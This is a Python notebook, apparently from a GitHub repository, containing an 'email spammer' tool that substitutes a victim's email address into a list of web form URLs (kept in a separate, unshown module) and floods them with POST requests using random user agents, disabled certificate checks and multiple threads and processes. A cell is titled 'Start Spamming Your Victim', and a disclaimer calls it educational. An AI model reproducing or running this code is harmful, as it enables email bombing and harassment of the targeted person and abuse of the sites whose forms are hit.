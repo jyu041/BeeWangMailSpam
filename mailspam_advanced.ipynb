{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "mailspam_advanced.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "toc_visible": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "VZlvkrj99Tld",
        "colab_type": "code",
        "cellView": "both",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 153
        },
        "outputId": "805e2eeb-d03b-4e98-a6c1-3f0fb9da89d4"
      },
      "source": [
        "#@title <> Setup part (1/2) <>\n",
        "import os\n",
        "print('Trying to import module Part 1 of 2\\n')\n",
        "os.system('pip install fake_useragent')\n",
        "print('This is an email spammer tool. This is for completely education purposes only. \\nPlease do not use this to do damage. I will not be responsible for all damage done. \\nAs this is just like a knife from the market, I only manufactured it, \\nbut you are the one using it. SO PLEASE BE CAREFUL USING THIS\\n')\n",
        "try:\n",
        "  import fake_useragent\n",
        "  from fake_useragent import UserAgent\n",
        "  print('Import Success')\n",
        "except:\n",
        "  print('Import Failed')\n",
        "  os.system('pip install fake_useragent')\n",
        "#@markdown This code cell is to import a public module that generates random UserAgents for connecting to websites\n"
      ],
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Trying to import module Part 1 of 2\n",
            "\n",
            "This is an email spammer tool. This is for completely education purposes only. \n",
            "Please do not use this to do damage. I will not be responsible for all damage done. \n",
            "As this is just like a knife from the market, I only manufactured it, \n",
            "but you are the one using it. SO PLEASE BE CAREFUL USING THIS\n",
            "\n",
            "Import Success\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "P_hLb0xsJ6BZ",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 51
        },
        "outputId": "a3b7308b-6d96-4da7-a66d-2d44dc781768"
      },
      "source": [
        "#@title <> Setup part (2/2) <>\n",
        "import os, shutil\n",
        "print('Trying to import link module')\n",
        "try:\n",
        "  import custom_urls\n",
        "  print('Successfully imported')\n",
        "except:\n",
        "  print('Import Failed')\n",
        "  print('Missing file \\'custom_urls.py\\' this is an important module\\n')\n",
        "  print('Please Read:')\n",
        "  print('The missing file/module \"custom_urls.py\"\\ncontaints the link entries\\nfor the email spammer, without\\nthis file the whole code would not\\nbe working, this file can be found by\\ncontacting the creator.')"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Trying to import link module\n",
            "Successfully imported\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cGaHaOR-9Tls",
        "colab_type": "code",
        "cellView": "both",
        "colab": {}
      },
      "source": [
        "#@title <> Start Spamming Your Victim <>\n",
        "\n",
        "import requests, multiprocessing, time, random, sys, os, threading, time\n",
        "from urllib3.exceptions import InsecureRequestWarning\n",
        "from fake_useragent import UserAgent\n",
        "import custom_urls\n",
        "\n",
        "ua = UserAgent()\n",
        "requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\n",
        "\n",
        "spam_id = \"\" #@param {type:\"string\"}\n",
        "bot_power = 1 #@param {type:\"slider\", min:1, max:12, step:1}\n",
        "\n",
        "\n",
        "def each_bot(link):\n",
        "\tfor single_url in link:\n",
        "\t\tsingle_url = single_url.replace('email=', f'email={spam_id}')\n",
        "\t\theader = {'User-Agent': f'{ua.random}'}\n",
        "\t\tresp = requests.post(url=str(single_url), headers=header, verify=False)\n",
        "\t\tprint(resp.status_code)\n",
        "\n",
        "def thread_power(for_list):\n",
        "\tbot_name = 'botting_0 = threading.Thread(target=each_bot, args= (for_list,))'\n",
        "\tbot_start = 'botting_0.start()'\n",
        "\tbot_join = 'botting_0.join()'\n",
        "\tfor botting_size in range(bot_power):\n",
        "\t\tbot_name = bot_name.replace(str(botting_size - 1), str(botting_size))\n",
        "\t\texec(bot_name)\n",
        "\t\tbot_start = bot_start.replace(str(botting_size - 1), str(botting_size))\n",
        "\t\texec(bot_start)\n",
        "\t\tbot_join = bot_join.replace(str(botting_size - 1), str(botting_size))\n",
        "\t\texec(bot_join)\n",
        "\n",
        "def create_process(big_list):\n",
        "\tthread_name = 'link_thread_0 = multiprocessing.Process(target= thread_power, args= (hope,))'\n",
        "\tthread_start = 'link_thread_0.start()'\n",
        "\tthread_join = 'link_thread_0.join()'\n",
        "\tfor the_len in range(len(big_list)):\n",
        "\t\thope = big_list[the_len]\n",
        "\t\tthread_name = thread_name.replace(str(the_len - 1), str(the_len))\n",
        "\t\texec(thread_name)\n",
        "\t\tthread_start = thread_start.replace(str(the_len - 1), str(the_len))\n",
        "\t\texec(thread_start)\n",
        "\t\tthread_join = thread_join.replace(str(the_len - 1), str(the_len))\n",
        "\t\texec(thread_join)\n",
        "\n",
        "try:\n",
        "\tcreate_process(custom_urls.total_urls)\n",
        "except KeyboardInterrupt:\n",
        "\tprint('User Ended Program')"
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}